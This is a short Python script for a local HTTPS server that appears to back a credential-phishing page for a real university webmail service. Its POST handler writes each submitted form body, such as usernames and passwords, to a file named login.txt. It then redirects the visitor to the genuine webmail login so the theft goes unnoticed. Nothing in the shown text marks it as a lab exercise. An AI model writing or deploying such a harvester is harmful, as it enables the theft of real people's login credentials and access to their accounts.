import http.server
import ssl
import os
import webbrowser

keypath = os.path.abspath('privkeyC.pem')
certpath = os.path.abspath('certC.crt')

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(302)
        varLen = int(self.headers['Content-Length'])
        self.server.postVars = self.rfile.read(varLen)
        print(self.server.postVars)
        file = open("login.txt", "a")
        file.write(self.server.postVars.decode().replace('&', '\n'))
        file.close()
        self.send_header('Location', "https://smail.pwr.edu.pl/auth?fromlogin=true&orgaccess=http&username=rrrr&password=t5t")
        self.end_headers()
#	webbrowser.open("https://smail.pwr.edu.pl/", new = 1)


port = 3050

httpd = http.server.HTTPServer(('localhost', port), MyHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=keypath, certfile=certpath, server_side=True)
print("serving at port", port)
httpd.serve_forever()

# python server.py
# https://localhost:3050/
